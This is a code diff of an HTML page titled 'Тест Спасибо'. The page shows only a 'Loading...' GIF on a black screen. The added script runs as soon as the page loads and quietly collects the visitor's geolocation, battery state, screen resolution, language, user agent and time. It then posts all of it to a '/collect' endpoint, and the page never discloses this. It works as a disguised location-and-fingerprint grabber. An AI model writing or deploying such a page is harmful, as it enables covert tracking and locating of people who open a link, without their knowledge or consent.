@@ -1,19 +1,66 @@
 <!DOCTYPE html>
- <html>
- <head>
-     <title>Тест Спасибо</title>
- </head>
- <body>
-     <h1>😁</h1>
-     <script>
-         fetch('/collect', {
-             method: 'POST',
-             headers: { 'Content-Type': 'application/json' },
-             body: JSON.stringify({
-                 userAgent: navigator.userAgent,
-                 time: new Date().toLocaleString()
-             })
-         });
-     </script>
- </body>
- </html>
+<html>
+<head>
+    <title>Тест Спасибо</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+        }
+        img {
+            width: 100px;
+            height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://media.giphy.com/media/3o7bu3XilJ5BOiSGic/giphy.gif" alt="Loading...">
+    <script>
+        async function sendData() {
+            const userAgent = navigator.userAgent;
+            const time = new Date().toLocaleString();
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || navigator.userLanguage;
+
+            let geolocation = null;
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                geolocation = `Широта: ${position.coords.latitude}, Долгота: ${position.coords.longitude}`;
+            } catch (error) {
+                geolocation = 'Не предоставлена';
+            }
+
+            let battery = null;
+            if ('getBattery' in navigator) {
+                try {
+                    const batteryInfo = await navigator.getBattery();
+                    battery = `Заряд: ${Math.round(batteryInfo.level * 100)}%, Заряжается: ${batteryInfo.charging ? 'Да' : 'Нет'}`;
+                } catch (error) {
+                    battery = 'Не предоставлена';
+                }
+            }
+
+            fetch('/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userAgent,
+                    time,
+                    geolocation,
+                    screenResolution,
+                    language,
+                    battery
+                })
+            });
+        }
+
+        sendData();
+    </script>
+</body>
+</html>
